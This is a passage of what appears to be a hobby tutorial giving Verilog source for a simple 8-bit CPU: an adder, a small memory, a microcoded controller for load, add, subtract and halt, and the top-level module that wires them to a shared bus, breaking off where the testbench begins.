<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> adder(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] a,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] b,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> sub,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> sub <span style="color:#f92672">?</span> a <span style="color:#f92672">-</span> b <span style="color:#f92672">:</span> a <span style="color:#f92672">+</span> b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-memory">The memory</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> memory(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> clk,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> rst,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> load,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// setting memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">initial</span> <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		$readmemh(<span style="color:#e6db74">&#34;program.bin&#34;</span>, ram);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] mar;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] ram[<span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">15</span>];		<span style="color:#75715e">// 16 8-bit wide elements
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#66d9ef">posedge</span> clk, <span style="color:#66d9ef">posedge</span> rst)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (rst)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			mar <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (load)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			mar <span style="color:#f92672">&lt;=</span> bus[<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> ram[mar];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-controller">The controller</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">Control signals:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	hlt: halt execution
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	pc_inc: increment program counter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	pc_en: put value of the pc onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	mar_load: load address into memory address register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	mem_en: put value from memory into the bus
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	ir_load: load value from bus into intruction register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	ir_en: put value in ir onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	a_load: load value from bus into A register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	a_en: put value in A onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	b_load: load value from bus into B register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	adder_sub: subtract value in B from A
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	adder_en: put value in adder onto the bus
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> controller(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> clk,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> rst,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] opcode,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> HLT <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> PC_INC <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> PC_EN <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> MAR_LOAD <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> MEM_EN <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> IR_LOAD <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> IR_EN <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> A_LOAD <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> A_EN <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> B_LOAD <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> ADDER_SUB <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> ADDER_EN <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> OP_LDA <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span><span style="color:#ae81ff">&#39;b0000</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> OP_ADD <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span><span style="color:#ae81ff">&#39;b0001</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> OP_SUB <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span><span style="color:#ae81ff">&#39;b0010</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">localparam</span> OP_HLT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span><span style="color:#ae81ff">&#39;b1111</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] stage;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] ctrl_word;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#66d9ef">posedge</span> clk, <span style="color:#66d9ef">posedge</span> rst)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (rst)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			stage <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (stage <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>				stage <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>				stage <span style="color:#f92672">&lt;=</span> stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#f92672">*</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		ctrl_word <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> (stage)
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>					ctrl_word[PC_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>					ctrl_word[MAR_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>					ctrl_word[PC_INC] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>					ctrl_word[MEM_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>					ctrl_word[IR_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">case</span> (opcode)
</span></span><span style="display:flex;"><span>						OP_LDA: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[IR_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[MAR_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        OP_ADD: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[IR_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[MAR_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        OP_SUB: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[IR_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[MAR_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        OP_HLT: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[HLT] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">endcase</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">case</span> (opcode)
</span></span><span style="display:flex;"><span>                        OP_LDA: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[MEM_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[A_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        OP_ADD: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[MEM_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[B_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        OP_SUB: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[MEM_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[B_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">endcase</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">case</span> (opcode)
</span></span><span style="display:flex;"><span>                        OP_ADD: 
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[ADDER_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[A_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        OP_SUB:
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>                                ctrl_word[ADDER_SUB] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[ADDER_EN] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                                ctrl_word[A_LOAD] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">endcase</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">endcase</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> ctrl_word;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-top-module">The top module</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> top_design(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> CLK
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// multiplex between the output of the different modules
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#f92672">*</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ir_en) 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			bus <span style="color:#f92672">=</span> ir_out;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (adder_en) 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			bus <span style="color:#f92672">=</span> adder_out;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (a_en) 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			bus <span style="color:#f92672">=</span> a_out;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mem_en) 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			bus <span style="color:#f92672">=</span> mem_out;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (pc_en) 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			bus <span style="color:#f92672">=</span> pc_out;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			bus <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// generate clock signal
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> rst;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> hlt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> clk;
</span></span><span style="display:flex;"><span>    clock clock (
</span></span><span style="display:flex;"><span>        .hlt(hlt),
</span></span><span style="display:flex;"><span>        .clk_in(CLK),
</span></span><span style="display:flex;"><span>        .clk_out(clk)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// program counter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> pc_inc;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> pc_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] pc_out;
</span></span><span style="display:flex;"><span>    pc pc(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .inc(pc_inc),
</span></span><span style="display:flex;"><span>        .out(pc_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> mar_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> mem_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] mem_out;
</span></span><span style="display:flex;"><span>    memory mem(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(mar_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(mem_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// A register (accumulator)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> a_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> a_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] a_out;
</span></span><span style="display:flex;"><span>    reg_a reg_a(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(a_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(a_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// B register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> b_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] b_out;
</span></span><span style="display:flex;"><span>    reg_b reg_b(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(b_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(b_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// adder 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> adder_sub;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> adder_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] adder_out;
</span></span><span style="display:flex;"><span>    adder adder(
</span></span><span style="display:flex;"><span>        .a(a_out),
</span></span><span style="display:flex;"><span>        .b(b_out),
</span></span><span style="display:flex;"><span>        .sub(adder_sub),
</span></span><span style="display:flex;"><span>        .out(adder_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// instruction register
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">wire</span> ir_load;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span> ir_en;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wire</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] ir_out;
</span></span><span style="display:flex;"><span>    ir ir(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .load(ir_load),
</span></span><span style="display:flex;"><span>        .bus(bus),
</span></span><span style="display:flex;"><span>        .out(ir_out)
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// controller
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    controller controller(
</span></span><span style="display:flex;"><span>        .clk(clk),
</span></span><span style="display:flex;"><span>        .rst(rst),
</span></span><span style="display:flex;"><span>        .opcode(ir_out[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span>]), <span style="color:#75715e">// upper 4 bits
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        .out(
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            hlt,
</span></span><span style="display:flex;"><span>            pc_inc,
</span></span><span style="display:flex;"><span>            pc_en,
</span></span><span style="display:flex;"><span>            mar_load,
</span></span><span style="display:flex;"><span>            mem_en,
</span></span><span style="display:flex;"><span>            ir_load,
</span></span><span style="display:flex;"><span>            ir_en,
</span></span><span style="display:flex;"><span>            a_load,
</span></span><span style="display:flex;"><span>            a_en,
</span></span><span style="display:flex;"><span>            b_load,
</span></span><span style="display:flex;"><span>            adder_sub,
</span></span><span style="display:flex;"><span>            adder_en
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-top-module-testbench">The top module testbench</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> top_design_tb();
